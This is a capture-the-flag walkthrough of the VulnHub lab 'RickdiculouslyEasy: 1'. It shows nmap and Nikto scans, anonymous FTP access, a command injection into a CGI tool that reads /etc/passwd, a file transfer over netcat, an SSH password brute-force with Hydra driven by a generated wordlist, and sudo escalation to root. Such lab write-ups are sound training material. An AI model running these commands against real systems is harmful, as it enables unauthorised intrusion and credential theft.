RickdiculouslyEasy: 1

https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/

* Author: Luke
* Series: vulnhub/RickdiculouslyEasy


## Flags
```
130/130 points
FLAG:{TheyFoundMyBackDoorMorty}-10Points
FLAG {There is no Zeus, in your face!} - 10 Points
FLAG{Whoa this is unexpected} - 10 Points
FLAG{Yeah d- just don't do it.} - 10 Points
FLAG{Flip the pickle Morty!} - 10 Points
FLAG{Get off the high road Summer!} - 10 Points
FLAG: {131333} - 20 Points
FLAG{And Awwwaaaaayyyy we Go!} - 20 Points
FLAG: {Ionic Defibrillator} - 30 points


First order is to scan target:

## Scan target using nmap
### Service Scan
```
nmap -sV -Pn -p- 192.168.253.128
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-14 21:52 MDT
Nmap scan report for 192.168.253.128
Host is up (0.00042s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh?
80/tcp    open  http    Apache httpd 2.4.27 ((Fedora))
9090/tcp  open  http    Cockpit web service
13337/tcp open  unknown
22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
60000/tcp open  unknown
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.70%I=7%D=8/14%Time=5B73A37A%P=x86_64-pc-linux-gnu%r(NULL
SF:,42,"Welcome\x20to\x20Ubuntu\x2014\.04\.5\x20LTS\x20\(GNU/Linux\x204\.4
SF:\.0-31-generic\x20x86_64\)\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port13337-TCP:V=7.70%I=7%D=8/14%Time=5B73A37A%P=x86_64-pc-linux-gnu%r(N
SF:ULL,29,"FLAG:{TheyFoundMyBackDoorMorty}-10Points\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port60000-TCP:V=7.70%I=7%D=8/14%Time=5B73A380%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\.\.
SF:\.\n#\x20")%r(ibm-db2,2F,"Welcome\x20to\x20Ricks\x20half\x20baked\x20re
SF:verse\x20shell\.\.\.\n#\x20");
MAC Address: 00:0C:29:61:7F:00 (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.05 seconds

Flag Found
```
FLAG:{TheyFoundMyBackDoorMorty}-10Points


### Open Browser on port 9090

Flag Found
```
FLAG {There is no Zeus, in your face!} - 10 Points

### Scanning FTP port for anonymous login
```
https://192.168.253.128:9090/
Connected to 192.168.253.128.
220 (vsFTPd 3.0.3)
Name (192.168.253.128:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
226 Directory send OK.
get FLAG.txt
local: FLAG.txt remote: FLAG.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for FLAG.txt (42 bytes).
226 Transfer complete.
42 bytes received in 0.00 secs (20.7569 kB/s)

FLAG Found
```
FLAG{Whoa this is unexpected} - 10 Points


## Checking port 22 for unknown service
### netcat to port
```
nc 192.168.253.128 22
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)

## Running web SCAN port 80
### Nikto running to discover anything
```nikto -h 192.168.253.128
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.253.128
+ Target Hostname:    192.168.253.128
+ Target Port:        80
+ Start Time:         2018-08-14 21:23:59 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.27 (Fedora)
+ Server leaks inodes via ETags, header found with file /, fields: 0x146 0x557458caf66e2 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /passwords/: Directory indexing found.
+ OSVDB-3092: /passwords/: This might be interesting...
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8345 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2018-08-14 21:24:18 (GMT-6) (19 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


## Exploring password directories discovered
Index of /passwords
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory 	 	- 	 
[TXT]	FLAG.txt 	2017-08-22 02:31 	44 	 
[TXT]	passwords.html 	2017-08-23 19:51 	352 	 

FLAG Found
```
FLAG{Yeah d- just don't do it.} - 10 Points

## Research passwords.html
```
<!DOCTYPE html>
<html>
<head>
<title>Morty's Website</title>
<body>Wow Morty real clever. Storing passwords in a file called passwords.html? You've really done it this time Morty. Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need.</body>
<!--Password: winter-->
</head>
</html>


## Connecting to port 60000
### net cat to the port
```
nc 192.168.253.128 60000
Welcome to Ricks half baked reverse shell...
# ls
FLAG.txt 

FLAG Found
```
FLAG{Flip the pickle Morty!} - 10 Points


## Found cgi_bin/tracertool.cgi
### determined that command chain could be performed
```

0; grep a /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
systemd-timesync:x:998:997:systemd Time Synchronization:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
chrony:x:995:993::/var/lib/chrony:/sbin/nologin
RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
Morty:x:1001:1001::/home/Morty:/bin/bash
Summer:x:1002:1002::/home/Summer:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin


## Trying to Users win Password Winter
### ssh to 22222
```
Last login: Wed Aug 15 14:42:20 2018
[Summer@localhost ~]$ ls
FLAG.txt
[Summer@localhost ~]$ cat FLAG.txt
                         _
                        | \
                        | |
                        | |
   |\                   | |
  /, ~\                / /
 X     `-.....-------./ /
  ~-. ~  ~              |
     \             /    |
      \  /_     ___\   /
      | /\ ~~~~~   \  |
      | | \        || |
      | |\ \       || )
     (_/ (_/      ((_/

[Summer@localhost ~]$ 


cat command doesn't work.
### using grep
```
[Summer@localhost ~]$ grep [a-zA-Z0-9] FLAG.txt 
FLAG{Get off the high road Summer!} - 10 Points

### Pivot into Morty's Directory
## found some files

ls -l
total 48
-rw-r--r--. 1 root root   414 Aug 22  2017 journal.txt.zip
-rw-r--r--. 1 root root 43145 Aug 22  2017 Safe_Password.jpg

Pulled the file over via netcat

nc -nvlp 443 > pass.jpg     --------   nc -nv <address> 443 < Safe_Password.jpg

Once file was on box, ran strings on it

strings pass.jpg 
JFIF
Exif
8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
8BIM
8BIM
$3br
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
	#3R
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
0D000D\DDDD\t\\\\\t


Unzipped file with password, and cat out response

cat journal.txt
Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?

Anyway. Here it is:

FLAG: {131333} - 20 Points 

FLAG found
```
FLAG: {131333} - 20 Points


## Directory Navigation
### Went to Ricks directory

cd RickSanchez/
[Summer@localhost RickSanchez]$ ls
RICKS_SAFE  ThisDoesntContainAnyFlags
[Summer@localhost RickSanchez]$ cd RICKS_SAFE/
[Summer@localhost RICKS_SAFE]$ ls
safe

copy file to gain control

[Summer@localhost RICKS_SAFE]$ cp safe /tmp/safe
[Summer@localhost RICKS_SAFE]$ cd /tmp
[Summer@localhost tmp]$ ls
safe

Run file now with password

[Summer@localhost tmp]$ ./safe 131333
decrypt: 	FLAG{And Awwwaaaaayyyy we Go!} - 20 Points

Ricks password hints:
 (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order


1 uppercase character
1 digit
One of the words in my old bands name.�	@
[Summer@localhost tmp]$ 

FLAG found
```
FLAG{And Awwwaaaaayyyy we Go!} - 20 Points


## Write Script to enumerate Passwords
### Python & Hydra
Needed to find band Name

cat password.py 
#!/usr/bin/python

import string

for c in string.ascii_uppercase:
    for x in range(0,10):
        print str(c) + str(x) + "Flesh"
        print str(c) + str(x) + "Curtains"

python password.py > password.txt

Ran Hydra with password file

hydra -s 22222 -v -V -l RickSanchez -P passwords.txt -t 16 192.168.253.128 ssh

[22222][ssh] host: 192.168.253.128   login: RickSanchez   password: P7Curtains
[STATUS] attack finished for 192.168.253.128 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2018-08-14 23:19:00


## Login with Rick
### user: RickSanchez pass: P7Curtains

```
There were 361 failed login attempts since the last successful login.
Last login: Thu Sep 21 09:45:24 2017
[RickSanchez@localhost ~]$ ls
RICKS_SAFE  ThisDoesntContainAnyFlags


### Check user's privs
```
[RickSanchez@localhost ~]$ sudo -l
Matching Defaults entries for RickSanchez on localhost:
    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME
    LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS
    _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User RickSanchez may run the following commands on localhost:
    (ALL) ALL
[RickSanchez@localhost ~]$ 


### Escalate privs
```
[RickSanchez@localhost ~]$ sudo -i
[root@localhost ~]# 
[root@localhost ~]# ls -l
total 8
-rw-------. 1 root root 1214 Aug 18  2017 anaconda-ks.cfg
-rw-r--r--. 1 root root   40 Aug 22  2017 FLAG.txt
[root@localhost ~]# 

FLAG Found
```
FLAG: {Ionic Defibrillator} - 30 points

## GOT ROOT
```
[root@localhost ~]#
















